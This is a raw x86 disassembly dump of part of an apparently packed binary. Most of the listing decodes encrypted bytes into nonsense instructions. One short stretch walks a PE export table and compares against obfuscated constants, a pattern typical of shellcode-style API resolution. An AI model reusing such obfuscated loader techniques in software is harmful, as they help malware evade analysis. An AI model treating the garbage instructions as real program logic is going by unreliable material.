  41616e:	es mov bh,0x61
  416171:	aas    
  416172:	dec    esi
  416173:	call   0x166c:0x1551924f
  41617a:	push   cs
  41617b:	pop    esi
  41617c:	sub    al,0x4
  41617e:	repnz call 0x59df:0x4579120f
  416186:	(bad)  
  416187:	cli    
  416188:	mov    ecx,DWORD PTR [ecx+edx*2]
  41618b:	xchg   esi,eax
  41618c:	ss jne 0x41618b
  41618f:	ret    0xd52c
  416192:	ss lock out dx,eax
  416195:	or     al,0x2a
  416197:	lahf   
  416198:	ins    BYTE PTR es:[edi],dx
  416199:	mov    gs,ebx
  41619b:	int    0xb6
  41619d:	leave  
  41619e:	push   cs
  41619f:	fs mov edi,0x1ee9a0a8
  4161a5:	nop
  4161a6:	push   es
  4161a7:	outs   dx,DWORD PTR ds:[esi]
  4161a8:	out    0x13,eax
  4161aa:	xchg   BYTE PTR ds:0x78131052,bl
  4161b0:	cmp    DWORD PTR [ecx+esi*2-0x41257bc7],ecx
  4161b7:	fild   WORD PTR [esi+0x1d]
  4161ba:	xchg   DWORD PTR [edx+0x4e],eax
  4161bd:	mov    ecx,0xac26ebac
  4161c2:	lods   al,BYTE PTR ds:[esi]
  4161c3:	pop    esp
  4161c4:	loope  0x41622d
  4161c6:	fs inc ebx
  4161c8:	bound  eax,QWORD PTR [esi+0x35eab96c]
  4161ce:	sbb    esp,edi
  4161d0:	add    dh,bh
  4161d2:	mov    eax,0x772742d3
  4161d7:	mov    ds:0x424cbbcb,al
  4161dc:	cli    
  4161dd:	lock lds ebx,FWORD PTR [ebx]
  4161e0:	xchg   ecx,eax
  4161e1:	inc    edx
  4161e2:	and    BYTE PTR [esi-0x459959ef],ch
  4161e8:	push   ebp
  4161e9:	jb     0x416196
  4161eb:	fmul   QWORD PTR [edx-0x17f2b235]
  4161f1:	or     al,BYTE PTR [eax+eax*1]
  4161f4:	pop    ecx
  4161f5:	push   ebx
  4161f6:	add    BYTE PTR [ecx+0x3736a277],al
  4161fc:	add    esp,DWORD PTR [ebp+0x4ca5652b]
  416202:	js     0x4161c0
  416204:	push   0x4e
  416206:	imul   ecx,DWORD PTR [ecx-0x4c],0x6135e18d
  41620d:	dec    esp
  41620e:	push   eax
  41620f:	jl     0x4161bd
  416211:	scas   eax,DWORD PTR es:[edi]
  416212:	jmp    0x3b9c:0x6f4f6ade
  416219:	fistp  QWORD PTR [esi-0x706a5321]
  41621f:	ins    BYTE PTR es:[edi],dx
  416220:	pushf  
  416221:	mov    cs,WORD PTR [ecx+0xb]
  416224:	xchg   edx,eax
  416225:	xchg   ebx,eax
  416226:	xchg   ebp,eax
  416227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416228:	adc    eax,0x9e685cb0
  41622d:	hlt    
  41622e:	dec    edx
  41622f:	fucom  st(7)
  416231:	ret    0xb2b4
  416234:	je     0x416225
  416236:	loopne 0x4161e7
  416238:	jmp    0x3669:0x32af2fe4
  41623f:	les    ebx,FWORD PTR [ebx+0x724bef24]
  416245:	cli    
  416246:	pop    esi
  416247:	call   DWORD PTR [ebx]
  416249:	ss stos DWORD PTR es:[edi],eax
  41624b:	and    BYTE PTR ds:0x70439d36,al
  416251:	iret   
  416252:	xor    BYTE PTR [esi+ebp*8-0x3e],bh
  416256:	xchg   esp,eax
  416257:	pop    es
  416258:	sub    ebx,DWORD PTR [esi+0x52]
  41625b:	adc    al,0xb
  41625d:	(bad)  
  41625e:	pop    edx
  41625f:	pop    es
  416260:	call   0x62cf:0x6952fa0c
  416267:	inc    ebp
  416268:	push   0x4c69a70a
  41626d:	add    BYTE PTR [ebx+edi*1-0x5a3a428b],0xeb
  416275:	push   edx
  416276:	js     0x41620b
  416278:	js     0x4162e0
  41627a:	and    eax,0x63f6d190
  41627f:	xchg   BYTE PTR [esi+esi*1+0x445e04fe],dl
  416286:	ror    DWORD PTR [edx-0xef6ba5a],0x89
  41628d:	xchg   ebx,ebx
  41628f:	add    al,0xff
  416291:	cmc    
  416292:	jp     0x416307
  416294:	pop    ebx
  416295:	and    al,0x1b
  416297:	fst    st(2)
  416299:	jg     0x4162a9
  41629b:	mov    WORD PTR cs:0x2346f8bd,fs
  4162a2:	fild   WORD PTR [ebx+eiz*4+0x72]
  4162a6:	adc    al,0x4f
  4162a8:	inc    edi
  4162a9:	not    DWORD PTR [esi+0x26c257e1]
  4162af:	test   DWORD PTR [esi-0x4b],0x676a334e
  4162b6:	or     eax,0x6aac34d2
  4162bb:	js     0x4162b3
  4162bd:	dec    eax
  4162be:	mov    ebx,DWORD PTR [esi]
  4162c0:	mov    al,BYTE PTR [eax-0x4d]
  4162c3:	dec    esi
  4162c4:	test   eax,0xa62cfaf7
  4162c9:	and    al,cl
  4162cb:	xchg   edi,eax
  4162cc:	dec    ebx
  4162cd:	mov    BYTE PTR [eax-0x38],dl
  4162d0:	xor    DWORD PTR [edx+0x57185e24],0xffffffee
  4162d7:	push   ebx
  4162d8:	push   ecx
  4162d9:	aad    0x76
  4162db:	cmc    
  4162dc:	mov    ch,bl
  4162de:	push   ss
  4162df:	out    0x40,al
  4162e1:	xchg   ecx,eax
  4162e2:	mov    ds:0xc2e7b31,al
  4162e7:	scas   eax,DWORD PTR es:[edi]
  4162e8:	pop    ss
  4162e9:	fs mov al,0x3e
  4162ec:	xchg   BYTE PTR ds:[esi+0x72],ch
  4162f0:	inc    ebp
  4162f1:	fwait
  4162f2:	adc    DWORD PTR fs:[edi],eax
  4162f5:	loop   0x416292
  4162f7:	mov    al,ds:0x5962a130
  4162fc:	arpl   WORD PTR [edi],di
  4162fe:	push   esi
  4162ff:	add    eax,0x8cfe23a0
  416304:	inc    ebx
  416305:	mov    ch,BYTE PTR [edi-0x534b6b20]
  41630b:	je     0x4162aa
  41630d:	cli    
  41630e:	push   ebx
  41630f:	pop    edi
  416310:	pop    ss
  416311:	xor    ecx,ecx
  416313:	pop    eax
  416314:	mov    bl,ch
  416316:	bound  ecx,QWORD PTR [esi-0x10]
  416319:	repnz cmp esi,DWORD PTR fs:[ecx+edx*1-0x6]
  41631f:	push   edx
  416320:	and    al,0xda
  416322:	add    eax,0x23acfdf7
  416327:	jb     0x4162db
  416329:	xchg   esi,eax
  41632a:	push   cs
  41632b:	jnp    0x4162db
  41632d:	daa    
  41632e:	dec    eax
  41632f:	popa   
  416330:	ins    DWORD PTR es:[edi],dx
  416331:	js     0x416304
  416333:	fs (bad) 
  416336:	out    0xf4,eax
  416338:	ret    0x568f
  41633b:	pop    esi
  41633c:	xor    bh,BYTE PTR [ebx]
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	imul   ecx,DWORD PTR [edx+0x5166bcce],0x7425b936
  416349:	pop    eax
  41634a:	ds mov ch,0xda
  41634d:	pop    edi
  41634e:	(bad)  
  416350:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416352:	stc    
  416353:	nop
  416354:	jnp    0x41635d
  416356:	imul   edx,DWORD PTR [ebx],0x7b
  416359:	and    eax,edx
  41635b:	and    BYTE PTR [edi-0xacd09e5],0xeb
  416362:	push   eax
  416363:	jb     0x4163e2
  416365:	repnz and BYTE PTR [ebx+ebp*1-0x7f],dh
  41636a:	dec    edx
  41636b:	and    eax,0x80b64e65
  416370:	lock jge 0x416381
  416373:	mov    edi,0x931c0521
  416378:	lahf   
  416379:	aad    0x66
  41637b:	cmp    eax,0xb666cf08
  416380:	adc    BYTE PTR [ebx-0xc],bl
  416383:	dec    edx
  416384:	std    
  416385:	xor    eax,0xe74f790e
  41638a:	out    dx,al
  41638b:	stos   DWORD PTR es:[edi],eax
  41638c:	scas   eax,DWORD PTR es:[edi]
  41638d:	test   al,0xf7
  41638f:	or     bl,ah
  416391:	jae    0x4163ab
  416393:	sub    BYTE PTR [ebp-0x55],0x3d
  416397:	int    0xf9
  416399:	sub    bl,BYTE PTR [esp+eiz*2-0x6e44b8a6]
  4163a0:	mov    ebp,0xfbfef950
  4163a5:	jp     0x41634e
  4163a7:	out    dx,al
  4163a8:	add    ecx,ebp
  4163aa:	out    0xbc,al
  4163ac:	(bad)  
  4163ad:	imul   ebp,DWORD PTR [esi-0x5b],0x1
  4163b1:	lock pop edx
  4163b3:	ja     0x416359
  4163b5:	fwait
  4163b6:	into   
  4163b7:	retf   0xcdfd
  4163ba:	lahf   
  4163bb:	bound  eax,QWORD PTR [edx+0x784ccf4b]
  4163c1:	inc    ebx
  4163c2:	sbb    BYTE PTR [eax-0x3e],bh
  4163c5:	outs   dx,BYTE PTR ds:[esi]
  4163c6:	sub    al,0x5
  4163c8:	(bad)  
  4163c9:	dec    ebp
  4163ca:	lods   eax,DWORD PTR ds:[esi]
  4163cb:	inc    ecx
  4163cc:	iret   
  4163cd:	mov    WORD PTR [edx+0x32],gs
  4163d0:	test   DWORD PTR [eax+eiz*2-0x1d],esp
  4163d4:	jmp    0x894f5be9
  4163d9:	aad    0xd4
  4163db:	(bad)
  4163e0:	push   esp
  4163e1:	sahf   
  4163e2:	add    esp,ecx
  4163e4:	ret    0x822e
  4163e7:	cmp    BYTE PTR [esi*2-0x4c35678b],dh
  4163ee:	sub    esi,eax
  4163f0:	cmp    DWORD PTR [edi+0x25a72228],ecx
  4163f6:	repz in eax,dx
  4163f8:	cmp    ah,BYTE PTR [ecx]
  4163fa:	lock jnp 0x416398
  4163fd:	push   ebp
  4163fe:	or     DWORD PTR [eax-0x42],0x47cccb2a
  416405:	or     esi,DWORD PTR [ecx]
  416407:	mov    edx,0x17da67a0
  41640c:	pop    ecx
  41640d:	mov    esp,0xecc6084f
  416412:	jg     0x416447
  416414:	and    ecx,DWORD PTR [esi-0x74108cbd]
  41641a:	xor    BYTE PTR [eax-0x3374384a],bl
  416420:	ret    0xc8e7
  416423:	xlat   BYTE PTR ds:[ebx]
  416424:	dec    edi
  416425:	jbe    0x416455
  416427:	ror    DWORD PTR [ecx-0x3afb0b30],1
  41642d:	mov    WORD PTR [ebp+0x7685e361],fs
  416433:	out    dx,al
  416434:	aaa    
  416435:	cmp    edx,DWORD PTR [esi-0x37]
  416438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416439:	scas   al,BYTE PTR es:[edi]
  41643a:	das    
  41643b:	mov    eax,ds:0xd6ed5ec7
  416440:	xchg   DWORD PTR [ecx-0x6e06d2d1],ebx
  416446:	xor    BYTE PTR [esi],dl
  416448:	xchg   edx,eax
  416449:	ret    0xb73d
  41644c:	push   eax
  41644d:	loop   0x4163e5
  41644f:	ja     0x41649f
  416451:	mov    BYTE PTR [edx+0x31],bh
  416454:	mov    esp,0x7a7dd1d0
  416459:	xchg   ebp,eax
  41645a:	cwde   
  41645b:	adc    dl,0x1b
  41645e:	aas    
  41645f:	stos   DWORD PTR es:[edi],eax
  416460:	xchg   ebp,eax
  416461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416462:	mov    ?,WORD PTR [edi]
  416464:	xchg   esi,eax
  416465:	and    al,0xd
  416467:	mov    ecx,0xb629e245
  41646c:	mov    ecx,0xd9f7e0ce
  416471:	leave  
  416472:	aaa    
  416473:	push   ds
  416474:	or     edx,edx
  416476:	and    eax,0x11f85460
  41647b:	sbb    ecx,esp
  41647d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41647e:	scas   eax,DWORD PTR es:[edi]
  41647f:	mov    cl,0x36
  416481:	sub    al,0x9b
  416483:	mov    eax,0xe507ad2c
  416488:	xor    al,0x63
  41648a:	fwait
  41648b:	mov    ds:0x852f22f7,al
  416490:	ja     0x416443
  416492:	jmp    0x41646e
  416494:	xchg   esi,eax
  416495:	aas    
  416496:	inc    edi
  416497:	mov    ch,0xdd
  416499:	xchg   ebp,eax
  41649a:	dec    ebx
  41649b:	push   eax
  41649c:	(bad)  
  41649e:	fistp  DWORD PTR [ecx-0x71]
  4164a1:	mov    edi,0x2810bdb1
  4164a6:	jge    0x416497
  4164a8:	jg     0x4164ca
  4164aa:	adc    ah,BYTE PTR [edx]
  4164ac:	ja     0x41643f
  4164ae:	sti    
  4164af:	repnz and eax,edi
  4164b2:	sub    al,0xae
  4164b4:	js     0x41652f
  4164b6:	sub    al,0x5e
  4164b8:	aad    0x92
  4164ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164bb:	out    dx,eax
  4164bc:	jb     0x41651f
  4164be:	arpl   sp,cx
  4164c0:	lock fstp st(2)
  4164c3:	rcr    BYTE PTR [edx-0x4d],cl
  4164c6:	mov    BYTE PTR ds:0xa15fae33,dl
  4164cc:	or     al,0xe9
  4164ce:	xchg   esp,eax
  4164cf:	pop    esi
  4164d0:	lea    ebp,[edi-0x6a]
  4164d3:	lahf   
  4164d4:	jl     0x4164cc
  4164d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164d7:	push   ds
  4164d8:	mov    al,0xbb
  4164da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164db:	sub    bl,BYTE PTR [edi+0x2d]
  4164de:	nop
  4164df:	cli    
  4164e0:	arpl   WORD PTR [edx+0x30],si
  4164e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e4:	and    ecx,ebp
  4164e6:	and    ecx,DWORD PTR [eax+0x73c38c7]
  4164ec:	test   al,0xaa
  4164ee:	push   0x3f
  4164f0:	lods   al,BYTE PTR ds:[esi]
  4164f1:	xlat   BYTE PTR ds:[ebx]
  4164f2:	xor    dh,BYTE PTR [eax+ebp*4+0x42457217]
  4164f9:	pop    eax
  4164fa:	sar    DWORD PTR [eax+ecx*1-0x2006ff88],0x95
  416502:	xor    eax,0xf1c4b00a
  416507:	mov    al,0x1b
  416509:	retf   0x1327
  41650c:	stos   DWORD PTR es:[edi],eax
  41650d:	nop
  41650e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41650f:	in     al,dx
  416510:	pop    ebx
  416511:	out    dx,al
  416512:	jl     0x41652c
  416514:	xchg   ebp,eax
  416515:	inc    ebx
  416516:	loope  0x41656c
  416518:	adc    esi,edx
  41651a:	mov    bl,0x7c
  41651c:	adc    dh,BYTE PTR [edx-0x13]
  41651f:	cmp    al,0x83
  416521:	test   eax,0x4e14c039
  416526:	xor    edx,ecx
  416528:	lock lock push di
  41652c:	xchg   edi,eax
  41652d:	int3   
  41652e:	stc    
  41652f:	adc    eax,DWORD PTR [ebx]
  416531:	sub    eax,0x58b9293c
  416536:	rcl    BYTE PTR [eax],1
  416538:	sub    al,0xf6
  41653a:	pop    esi
  41653b:	xor    BYTE PTR [ebx],ch
  41653d:	sbb    esp,DWORD PTR [edi]
  41653f:	in     al,dx
  416540:	ror    BYTE PTR [ebp-0xa],0xc3
  416544:	(bad)  
  416545:	(bad)  
  416546:	or     eax,ebx
  416548:	into   
  416549:	sbb    eax,0xa12f7f24
  41654e:	push   edi
  41654f:	mov    esp,0x9609e951
  416554:	fldenv [edi+ebx*8-0x50]
  416558:	jp     0x4165af
  41655a:	adc    eax,0x495d811f
  41655f:	(bad)  
  416561:	sbb    al,0xd3
  416563:	sti    
  416564:	in     eax,dx
  416565:	outs   dx,BYTE PTR ds:[esi]
  416566:	jo     0x4165d8
  416568:	adc    al,0x7a
  41656a:	mov    ds:0x404b28c,eax
  41656f:	stc    
  416570:	sbb    DWORD PTR [edx],esi
  416572:	(bad)  
  416573:	push   esi
  416574:	fwait
  416575:	lock xchg esp,eax
  416577:	jae    0x4165a4
  416579:	in     eax,0xf8
  41657b:	dec    ebp
  41657c:	jb     0x416510
  41657e:	dec    ecx
  41657f:	jp     0x4165e5
  416581:	or     al,0x6
  416583:	inc    eax
  416584:	std    
  416585:	xchg   esp,eax
  416586:	sbb    BYTE PTR [edx+edi*2],0x71
  41658a:	pusha  
  41658b:	add    eax,0x9937425a
  416590:	mov    eax,0x39705f06
  416595:	push   ebp
  416596:	popf   
  416597:	imul   esp,DWORD PTR [ecx-0x6fa2b19d],0xffffffd1
  41659e:	mov    BYTE PTR [eax],0xf9
  4165a1:	in     eax,dx
  4165a2:	add    ah,BYTE PTR [edi+0x6fff21ce]
  4165a8:	xchg   edi,eax
  4165a9:	sbb    esi,esp
  4165ab:	shl    BYTE PTR [esi-0x7fcb5a9e],0xbc
  4165b2:	fs retf 
  4165b4:	sbb    ebx,ebx
  4165b6:	push   0x34d7653a
  4165bb:	test   DWORD PTR [esi-0xca938ec],0x8c923a4
  4165c5:	push   ebp
  4165c6:	fnsave gs:[edi+0x17ec3d8]
  4165cd:	inc    edi
  4165ce:	inc    eax
  4165cf:	dec    ebx
  4165d0:	push   es
  4165d1:	jo     0x416633
  4165d3:	arpl   WORD PTR [eax-0x7c022b96],bx
  4165d9:	xor    ebp,DWORD PTR [esi]
  4165db:	ss inc edx
  4165dd:	lea    eax,[ebx+0x362ecbef]
  4165e3:	mov    ecx,0x7da4f5e2
  4165e8:	pushf  
  4165e9:	lds    ecx,FWORD PTR [ebp+eiz*1-0x4a]
  4165ed:	outs   dx,DWORD PTR ds:[esi]
  4165ee:	loopne 0x4165ec
  4165f0:	stos   DWORD PTR es:[edi],eax
  4165f1:	or     eax,0x696bebd1
  4165f6:	out    0x68,al
  4165f8:	cmc    
  4165f9:	or     eax,0x22850f
  4165fe:	add    BYTE PTR [eax],al
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    ch,BYTE PTR [esi+0x40]
  416674:	jne    0x41664d
  416676:	(bad)  [ebx]
  416678:	popa   
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	cmp    al,0xed
  416680:	arpl   bp,bx
  416682:	div    BYTE PTR [edx]
  416684:	xor    eax,0xd6873021
  416689:	pop    ebx
  41668a:	jg     0x4166ed
  41668c:	cmp    ebx,esp
  41668e:	bound  ebp,QWORD PTR ds:0x9052025
  416694:	mov    eax,0x1efb89ff
  416699:	sar    DWORD PTR [eax-0x2c8055e9],1
  41669f:	popa   
  4166a0:	push   ebp
  4166a1:	cmp    dh,BYTE PTR [ebp-0x79]
  4166a4:	dec    ebp
  4166a5:	out    dx,eax
  4166a6:	fstp   TBYTE PTR [eax-0x44]
  4166a9:	xchg   edi,eax
  4166aa:	addr16 jle 0x4166ef
  4166ad:	lahf   
  4166ae:	in     al,0xe2
  4166b0:	fdiv   QWORD PTR [eax+0x200cec2a]
  4166b6:	daa    
  4166b7:	ret    
  4166b8:	mov    bh,0x32
  4166ba:	push   0x12
  4166bc:	in     al,dx
  4166bd:	js     0x4166c5
  4166bf:	push   0xffffffb1
  4166c1:	mov    WORD PTR [edi],fs
  4166c3:	imul   edx,DWORD PTR [edi-0x1f],0x8c076953
  4166ca:	xlat   BYTE PTR ds:[ebx]
  4166cb:	(bad)  
  4166cc:	aad    0xc8
  4166ce:	imul   esp,DWORD PTR [ecx+0x76],0x83868882
  4166d5:	cmp    al,0x1f
  4166d7:	or     bl,BYTE PTR [edi-0x541f424d]
  4166dd:	pop    edx
  4166de:	pusha  
  4166df:	popa   
  4166e0:	mov    al,ds:0x75974955
  4166e5:	mov    edx,0x420eab3c
  4166ea:	and    al,0xd
  4166ec:	pop    esp
  4166ed:	iret   
  4166ee:	call   esp
  4166f0:	jge    0x41674c
  4166f2:	lds    eax,FWORD PTR [ebx+0x6eaf1092]
  4166f8:	call   0xe9fd:0x5714b0b7
  4166ff:	xor    al,0x8d
  416701:	sbb    BYTE PTR [edi+0x6b],ch
  416704:	out    dx,eax
  416705:	js     0x41677c
  416707:	xchg   ecx,eax
  416708:	pop    edi
  416709:	int    0x78
  41670b:	jg     0x4166b0
  41670d:	dec    ebx
  41670e:	xor    BYTE PTR [esi+0x1f],bh
  416711:	ins    DWORD PTR es:[edi],dx
  416712:	dec    eax
  416713:	mov    ecx,0xb704acd5
  416718:	fisub  DWORD PTR [ecx]
  41671a:	pushf  
  41671b:	push   esi
  41671c:	std    
  41671d:	mov    esp,0xd7a7db
  416722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416723:	loopne 0x4166d1
  416725:	jecxz  0x4166c1
  416727:	fnstcw WORD PTR [ecx+eax*2]
  41672a:	sub    ebp,DWORD PTR [edi+0x47a30a00]
  416730:	or     al,0x15
  416732:	aad    0x62
  416734:	gs pop ebp
  416736:	stc    
  416737:	sub    al,0x7d
  416739:	push   eax
  41673a:	adc    dh,BYTE PTR [eax]
  41673c:	dec    edi
  41673d:	mov    bl,BYTE PTR [esi+edi*2+0x3c]
  416741:	mov    ebp,0x82035349
  416746:	cmp    eax,0xf5f41672
  41674b:	repz dec esp
  41674d:	inc    edi
  41674e:	xchg   BYTE PTR [edx+0x5f],bh
  416751:	add    BYTE PTR [ebx+0x486e794f],ah
  416757:	mov    ch,0xb5
  416759:	mov    esp,0xf1580a98
  41675e:	sar    ah,0x11
  416761:	not    BYTE PTR [esp+ecx*4+0x7a]
  416765:	out    dx,al
  416766:	jg     0x41677c
  416768:	cld    
  416769:	ins    BYTE PTR es:[edi],dx
  41676a:	inc    eax
  41676b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41676c:	stos   BYTE PTR es:[edi],al
  41676d:	rcl    bh,cl
  41676f:	pop    ss
  416770:	rol    eax,1
  416772:	adc    DWORD PTR [esi+0x37ee5fb6],ecx
  416778:	dec    esp
  416779:	ja     0x41677b
  41677b:	(bad)  
  41677c:	jae    0x4167f4
  41677e:	repz jns 0x4167c1
  416781:	or     ch,al
  416783:	out    0x81,eax
  416785:	adc    bl,BYTE PTR [edi]
  416787:	nop
  416788:	pop    ebp
  416789:	lahf   
  41678a:	into   
  41678b:	cmp    al,0xc0
  41678d:	out    dx,al
  41678e:	pushf  
  41678f:	rol    BYTE PTR [ecx-0x2c014baf],0x3f
  416796:	add    ebx,DWORD PTR [esi-0x2c]
  416799:	jecxz  0x41681a
  41679b:	pop    esi
  41679c:	mov    bh,0x3c
  41679e:	loop   0x4167ec
  4167a0:	ins    DWORD PTR es:[edi],dx
  4167a1:	sub    BYTE PTR [ebp-0x77],ch
  4167a4:	or     ecx,ecx
  4167a6:	int    0xf3
  4167a8:	fistp  DWORD PTR [ebx+ebx*8]
  4167ab:	or     eax,DWORD PTR [esp+ecx*1]
  4167ae:	push   esi
  4167af:	in     eax,dx
  4167b0:	push   ebp
  4167b1:	nop
  4167b2:	jl     0x416780
  4167b4:	aas    
  4167b5:	pusha  
  4167b6:	fdivr  DWORD PTR [edx-0x4b]
  4167b9:	pop    ss
  4167ba:	push   0xffffff84
  4167bc:	cmp    eax,0xbada1658
  4167c1:	jle    0x416813
  4167c3:	jae    0x416817
  4167c5:	lock mov ah,0x93
  4167c8:	mov    dl,0xf4
  4167ca:	xchg   ecx,eax
  4167cb:	push   ss
  4167cc:	dec    ebx
  4167cd:	adc    BYTE PTR [eax],bh
  4167cf:	mov    edi,0x278f928d
  4167d4:	test   al,0x6b
  4167d6:	jp     0x416815
  4167d8:	push   es
  4167d9:	jo     0x416839
  4167db:	lds    ebp,FWORD PTR [eax]
  4167dd:	jmp    0x3701964a
  4167e2:	(bad)  
  4167e3:	js     0x416864
  4167e5:	sbb    BYTE PTR [edi-0x63ebe8],dl
  4167eb:	jmp    0x416820
  4167ed:	ror    DWORD PTR [ebp-0xc],1
  4167f0:	add    BYTE PTR [ebx],0xab
  4167f3:	fmul   st(7),st
  4167f5:	push   edi
  4167f6:	cmp    bh,ch
  4167f8:	xchg   BYTE PTR [ebp+0xc46434b],al
  4167fe:	push   eax
  4167ff:	sub    BYTE PTR [ebp-0x45],0xc0
  416803:	inc    ecx
  416804:	mov    edx,0xa0dda8cc
  416809:	pusha  
  41680a:	retf   0xeb99
  41680d:	dec    edi
  41680e:	mov    al,ds:0x40eb04bb
  416813:	repnz nop
  416815:	mov    ecx,0x2f0d2365
  41681a:	loopne 0x4167c2
  41681c:	aas    
  41681d:	dec    edi
  41681e:	(bad)  
  41681f:	out    dx,eax
  416820:	or     esi,edi
  416822:	test   eax,0x58db7187
  416827:	mov    ah,0xe2
  416829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41682a:	je     0x41683f
  41682c:	and    BYTE PTR [ebp+0x161ee659],0xda
  416833:	(bad)  
  416834:	fistp  DWORD PTR [ebp-0x6ff91453]
  41683a:	iret   
  41683b:	xor    eax,0xc009ba87
  416840:	or     al,0x4b
  416842:	dec    esi
  416843:	shl    dl,cl
  416845:	imul   eax,ecx,0x7e
  416848:	sti    
  416849:	adc    edx,DWORD PTR [eax]
  41684b:	aas    
  41684c:	sub    esp,esp
  41684e:	inc    edx
  41684f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416850:	rol    BYTE PTR [eax],0x83
  416853:	mov    edi,0xe3b94f4a
  416858:	fs mov edi,0x87e07c6b
  41685e:	in     al,dx
  41685f:	jg     0x4167e4
  416861:	cdq    
  416862:	ins    DWORD PTR es:[edi],dx
  416863:	cld    
  416864:	jae    0x41681d
  416866:	sbb    eax,0x70155b50
  41686b:	push   0x26
  41686d:	fwait
  41686e:	cld    
  41686f:	pop    ebx
  416870:	sbb    DWORD PTR [esi+ebp*8+0x7a],0x810bef68
  416878:	ds in  al,dx
  41687a:	rol    DWORD PTR [esi+0x6b],0x0
  41687e:	cmp    esi,0x608e760e
  416884:	add    al,BYTE PTR [edx-0x785d12a0]
  41688a:	pop    ebp
  41688b:	fld    DWORD PTR [ebx-0x75241b1c]
  416891:	fwait
  416892:	inc    edx
  416893:	jl     0x4168ae
  416895:	push   ebp
  416896:	and    BYTE PTR [ecx],al
  416898:	lods   al,BYTE PTR ds:[esi]
  416899:	ffree  st(7)
  41689b:	imul   esi,DWORD PTR gs:[ebx+0x18332088],0x7aae3d2f
  4168a6:	mov    eax,0xc8e00878
  4168ab:	push   ds
  4168ac:	(bad)  
  4168ad:	pop    eax
  4168ae:	into   
  4168af:	xchg   DWORD PTR [edi-0x49517058],esp
  4168b5:	sbb    edx,DWORD PTR [edi-0x6dae3a76]
  4168bb:	and    eax,0xde513a70
  4168c0:	data16 jle 0x416868
  4168c3:	fiadd  WORD PTR [ecx+0x3]
  4168c6:	adc    al,0xe6
  4168c8:	out    dx,al
  4168c9:	add    ebp,DWORD PTR [esi+0x46]
  4168cc:	data16 aaa 
  4168ce:	sbb    BYTE PTR [eax],ah
  4168d0:	fmul   QWORD PTR [esi]
  4168d2:	lds    ebx,FWORD PTR [ecx-0x27f90e8d]
  4168d8:	in     al,dx
  4168d9:	repz inc edi
  4168db:	or     dh,cl
  4168dd:	xlat   BYTE PTR ds:[ebx]
  4168de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168df:	xchg   esi,eax
  4168e0:	stos   BYTE PTR es:[edi],al
  4168e1:	cmp    DWORD PTR [ebx],ecx
  4168e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168e4:	push   ebx
  4168e5:	dec    ecx
  4168e6:	aam    0xf7
  4168e8:	int3   
  4168e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168ea:	pop    ebx
  4168eb:	jbe    0x416887
  4168ed:	or     al,0x37
  4168ef:	or     edi,DWORD PTR [ebp+0x7e1f991e]
  4168f5:	aad    0xdb
  4168f7:	rol    edi,0xaf
  4168fa:	adc    eax,0x304d46e4
  4168ff:	ins    DWORD PTR es:[edi],dx
  416900:	or     ch,BYTE PTR [eax+eax*4]
  416903:	sahf   
  416904:	jo     0x4168ff
  416906:	jg     0x41689f
  416908:	cmp    eax,0xcfeff8d0
  41690d:	in     eax,0x7d
  41690f:	lea    edx,[edx-0x7402f49a]
  416915:	dec    ecx
  416916:	and    al,0x5b
  416918:	cld    
  416919:	fnsave [eax+eax*2-0x47777801]
  416920:	dec    edi
  416921:	scas   eax,DWORD PTR es:[edi]
  416922:	and    dh,0xb5
  416925:	int3   
  416926:	aaa    
  416927:	out    dx,al
  416928:	inc    esi
  416929:	sar    DWORD PTR [eax+0x10],0x57
  41692d:	sbb    dl,BYTE PTR [eax+0x5c93c788]
  416933:	xchg   ebp,eax
  416934:	fnsave [ecx]
  416936:	push   ebx
  416937:	pop    ss
  416938:	ss test dl,al
  41693b:	pop    es
  41693c:	dec    eax
  41693d:	sub    ah,al
  41693f:	jne    0x4169c0
  416941:	fldcw  WORD PTR [ecx]
  416943:	push   esi
  416944:	(bad)  
  416945:	mov    cl,0x1c
  416947:	sbb    BYTE PTR [esi],dl
  416949:	scas   al,BYTE PTR es:[edi]
  41694a:	pop    ebx
